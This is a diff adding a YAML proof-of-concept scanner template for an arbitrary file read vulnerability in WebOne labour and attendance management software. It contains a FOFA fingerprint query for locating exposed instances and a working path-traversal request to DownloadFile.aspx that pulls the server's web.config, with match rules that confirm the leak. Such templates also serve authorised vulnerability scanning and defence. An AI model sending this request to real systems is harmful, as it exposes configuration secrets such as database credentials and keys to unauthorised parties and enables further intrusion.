@@ -1,0 +1,27 @@
+id: poc-yaml-webone-lams-downloadfile-aspx-anyfile-read
+info:
+  name: WebOne 劳动力与考勤管理软件 DownloadFile.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: WebOne 劳动力与考勤管理软件
+  fofa: title="Webone-WTS劳动力管理套件"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"Webone-WTS劳动力管理套件")
+- method: GET
+  path: /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report
+  expression: 'status_code == 200 &&
+
+    contains(body,"</system.web>") &&
+
+    contains(body,"<configuration>") &&
+
+    contains(headers,"filename=") &&
+
+    contains(content_type,"application/octet-stream")
+
+    '
+variables: {}
+transport: http
